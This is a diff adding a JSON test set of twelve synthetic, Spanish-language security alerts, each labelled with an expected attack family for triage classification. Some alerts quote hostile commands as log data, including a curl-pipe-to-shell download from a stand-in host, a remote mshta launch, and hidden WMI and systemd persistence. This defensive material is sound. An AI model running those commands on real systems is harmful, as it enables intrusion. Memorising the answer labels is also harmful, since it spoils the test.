@@ -1,0 +1,74 @@
+[
+  {
+    "id": "CF2-01",
+    "texto": "Rule: 100150 (level 10) -> 'Múltiples fallos de preautenticación Kerberos desde un mismo equipo' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | win.system.eventID: 4771 | win.eventdata.ipAddress: 192.0.2.47 (pc-ventas-12) | win.eventdata.status: 0x18 | Contexto: 31 cuentas distintas con 1 fallo cada una en 6 min desde el mismo equipo; ninguna autenticación correcta",
+    "familia_esperada": "F1",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "CF2-02",
+    "texto": "Rule: 100370 (level 10) -> 'Inicios de sesión RDP con la cuenta de administrador local en varios puestos' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | win.system.eventID: 4624 | win.eventdata.logonType: 10 | win.eventdata.targetUserName: Administrador | win.eventdata.ipAddress: 192.0.2.31 (pc-adm-07) | Contexto: sin fallos previos; en 5 min el mismo origen abrió sesión correcta en pc-contab-03, pc-ventas-12 y pc-ventas-14 con la misma cuenta local",
+    "familia_esperada": "F3",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "CF2-03",
+    "texto": "Rule: 100160 (level 12) -> 'Aprobación de segundo factor tras una ráfaga de solicitudes rechazadas' | Agent: srv-vpn-01 (192.0.2.4) | Location: /var/log/vpn/auth.log | User: usuario02 | Src IP: 192.0.2.160 | Contexto: 22 solicitudes de segundo factor rechazadas en 9 min y luego una aprobada; contraseña correcta en todos los intentos; la persona estaba fuera del horario laboral",
+    "familia_esperada": "F1",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "CF2-04",
+    "texto": "Rule: 100380 (level 12) -> 'mmc.exe lanza cmd.exe' | Agent: srv-fich-01 (192.0.2.12) | Location: EventChannel | win.system.eventID: 1 (Sysmon) | win.eventdata.parentImage: C:\\Windows\\System32\\mmc.exe | win.eventdata.parentCommandLine: C:\\Windows\\System32\\mmc.exe -Embedding | win.eventdata.commandLine: cmd.exe /c ipconfig /all | win.eventdata.user: EJEMPLO\\admin.local | Contexto: inicio de sesión de red (4624, logonType 3) con la misma cuenta desde 192.0.2.31 (pc-adm-07) 2 s antes; nadie tenía sesión abierta en la consola del servidor",
+    "familia_esperada": "F3",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "CF2-05",
+    "texto": "Rule: 100270 (level 12) -> 'rundll32 ejecuta una DLL desde la carpeta temporal' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | win.system.eventID: 1 (Sysmon) | win.eventdata.parentImage: C:\\Program Files\\Mail\\mailclient.exe | win.eventdata.commandLine: rundll32.exe C:\\Users\\usuario02\\AppData\\Local\\Temp\\fact_0923.dll,Inicio | win.eventdata.user: EJEMPLO\\usuario02 | Contexto: la usuaria abrió un adjunto 10 s antes en su sesión local; no hay inicios de sesión de red ni conexiones entrantes",
+    "familia_esperada": "F2",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "CF2-06",
+    "texto": "Rule: 100390 (level 12) -> 'Comandos ejecutados por SSH desde otro servidor interno' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/audit/audit.log | audit.exe: /bin/bash | audit.execve.a2: curl -s http://descargas.example/x.sh | sh | proceso padre: sshd: operador02@notty | Src IP: 192.0.2.22 (srv-app-03) | Contexto: sesión SSH no interactiva abierta 1 s antes desde srv-app-03, que no suele administrar este servidor",
+    "familia_esperada": "F3",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "CF2-07",
+    "texto": "Rule: 100280 (level 12) -> 'Suscripción de eventos WMI creada' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | win.system.eventID: 20 (Sysmon WmiEventConsumer) | win.eventdata.name: ActualizadorWmi | win.eventdata.destination: powershell.exe -w hidden -c C:\\Users\\Public\\upd.ps1 | win.eventdata.user: EJEMPLO\\usuario01 | Contexto: se crearon también el filtro (evento 19) y el enlace (evento 21); la suscripción se ejecuta cada vez que arranca el equipo",
+    "familia_esperada": "F5",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "CF2-08",
+    "texto": "Rule: 100290 (level 12) -> 'mshta.exe ejecuta una aplicación HTML remota' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | win.system.eventID: 1 (Sysmon) | win.eventdata.parentImage: C:\\Windows\\explorer.exe | win.eventdata.commandLine: mshta.exe http://descargas.example/ver.hta | win.eventdata.user: EJEMPLO\\usuario03 | Contexto: el proceso sigue en ejecución; no se crearon archivos, tareas, servicios ni claves de registro nuevas",
+    "familia_esperada": "F2",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "CF2-09",
+    "texto": "Rule: 554 (level 5) -> 'File added to the system.' | Agent: srv-app-03 (192.0.2.22) | Location: syscheck | syscheck.path: /etc/systemd/system/sys-update.service | syscheck.diff: 'ExecStart=/opt/.cache/su-upd' 'Restart=always' 'WantedBy=multi-user.target' | syscheck.audit.user.name: root | syscheck.audit.process.name: /usr/bin/bash | Contexto: luego se ejecutó systemctl enable sys-update.service",
+    "familia_esperada": "F5",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "CF2-10",
+    "texto": "Rule: 100640 (level 12) -> 'Servidor NTP interno responde a consultas monlist masivas' | Agent: srv-fw-01 (192.0.2.1) | Location: /var/log/firewall.log | srcip: 192.0.2.123 (srv-ntp-01) | dstip: 192.0.2.250 | dst_zone: internet | bytes_out: 9 GB en 20 min | Contexto: las respuestas van a una dirección de origen falsificada; el contenido son listas de clientes NTP, no archivos internos; la sincronización horaria de la oficina falla",
+    "familia_esperada": "F6",
+    "frontera": "F4/F6"
+  },
+  {
+    "id": "CF2-11",
+    "texto": "Rule: 100550 (level 12) -> 'Paquetes ICMP de eco con carga útil anómala' | Agent: srv-fw-01 (192.0.2.1) | Location: /var/log/firewall.log | srcip: 192.0.2.36 (pc-contab-03) | dstip: 192.0.2.241 | dst_zone: internet | 14000 paquetes ICMP echo-request de 1400 bytes en 30 min (lo normal son 64 bytes) | Contexto: el destino no tiene relación con la organización; el proceso que los genera es C:\\Users\\usuario03\\AppData\\Roaming\\sync\\icm.exe",
+    "familia_esperada": "F4",
+    "frontera": "F4/F6"
+  },
+  {
+    "id": "CF2-12",
+    "texto": "Rule: 100560 (level 12) -> 'Subida de gran volumen desde el servidor de base de datos fuera de horario' | Agent: srv-fw-01 (192.0.2.1) | Location: /var/log/firewall.log | srcip: 192.0.2.20 (srv-bd-02) | dstip: 192.0.2.242 | dstport: 443 | dst_zone: internet | bytes_out: 22 GB en 50 min, a las 03:10 | Contexto: 10 min antes se ejecutó pg_dump de toda la base en srv-bd-02; el enlace de salida quedó al 95 % y la aplicación de ventas responde lento",
+    "familia_esperada": "F4",
+    "frontera": "F4/F6"
+  }
+]
